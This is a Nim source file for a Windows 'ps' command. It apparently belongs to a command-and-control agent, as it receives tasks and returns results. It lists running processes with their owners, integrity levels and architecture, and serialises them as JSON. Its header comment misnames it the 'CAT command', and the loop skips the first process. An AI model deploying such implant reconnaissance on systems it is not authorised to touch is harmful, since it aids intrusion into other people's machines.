# This is the source for the CAT command
import ../structs
import ../utils
import ../rth/utils/winapi_wrapper
import json
import winim
import std/tables

type
  ProcessInfo = object
    process_id: int
    host: string
    architecture: string
    bin_path: string
    commmand_line: string
    #company_name: string
    name: string
    description: string
    integrity_level: int
    parent_process_id: int
    #session_id: int
    #start_time: string
    user: string
    signer: string
    #window_title: string


#[
Shows a table of all running
processes

  No Parameters

]#
proc cmd_ps*(task: Task): seq[TaskResponse] {.cdecl.} =

  # Configure Output
  var
    output = ""
    # Required for the main code
    entry: PROCESSENTRY32
    hSnapshot: HANDLE

  var processList: seq[ProcessInfo]


  entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  defer: CloseHandle(hSnapshot)


  if Process32First(hSnapshot, addr entry):

    while Process32Next(hSnapshot, addr entry):
      var pInfo = ProcessInfo()
      pInfo.name = entry.szExeFile.toString
      pInfo.process_id = cast[int](entry.th32ProcessID)
      pInfo.parent_process_id = cast[int](entry.th32ParentProcessID)

      DBG(entry.szExeFile.toString)

      var pHandle = wOpenProcess(cast[DWORD](PROCESS_QUERY_LIMITED_INFORMATION), false, entry.th32ProcessID)

      if pHandle == 0:
        processList.add(pInfo)
        continue

      pInfo.architecture = getArchitecture(pHandle)
      pInfo.user = getProcessOwner(pHandle)
      pInfo.integrity_level = getIntegrityLevel(pHandle)
      pInfo.host = getHost()

      processList.add(pInfo)

  output = $(%*{"processes": process_list}.toTable)
  #output = $(%*process_List)

  # return the response
  return buildReturnData(task.id, output)

